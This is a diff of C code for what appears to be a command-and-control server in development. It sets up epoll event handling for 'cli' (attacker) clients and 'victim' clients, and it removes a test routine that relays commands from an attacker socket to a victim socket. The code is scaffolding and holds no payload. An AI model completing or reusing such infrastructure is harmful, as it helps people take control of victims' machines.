@@ -7,9 +7,7 @@
 #include <fcntl.h>
 #include <arpa/inet.h>
 
-#include "event.h"
 #include "server.h"
-#include "netwerking.h"
 
 /* Global Vars */
 struct commandServer server; /* Server global state  */
@@ -61,35 +59,25 @@ void initServer(void){
         /* Initialize Server Commands */
 
         /* Handle Events  */
-        // Create event loop for connecting cli clients
-        // Create event loop for connecting victim clients
-        
+        // Create event_loop fd to handle connecting cli clients
+        int j;
+        for(j=0; j < server.clifd_count; j++) {
+               if (createEpollEvent(server.event_loop, server.clifd[j], EVENT_READ) == EVENT_ERR)                  
+                        perror("createEpollFileEvent");
+        }
+        // Create event_loop fd to handle connecting victim clients
+
 }
+
+/* ==== Welcome to the Main Event ====  */
 
 int main(void){
   
         initServer();
         asciiArt();
-       
-        // Test new connections 
-        int attacker, victim, valread;
-        char buffer[1024] = {0}; 
-        struct sockaddr_in address;
-        int addrlen = sizeof(address);
-        
-        if ((attacker = accept(server.clifd[0], (struct sockaddr *)&address, (socklen_t*)&addrlen))<0){
-                perror("ERROR accept");
-        }
-        
-        if ((victim = accept(server.victimfd[0], (struct sockaddr *)&address, (socklen_t*)&addrlen))<0){
-                perror("ERROR accept");
-        }
-        
-        valread = read(attacker, buffer, 1024);
-        printf("Received: %s\n",buffer);
-        send(victim, buffer, strlen(buffer), 0); 
 
-        //eventMain();
+        // Main Event Loop
+        eventMain(server.event_loop, server.clifd[0]);
         
         return 0;
 }
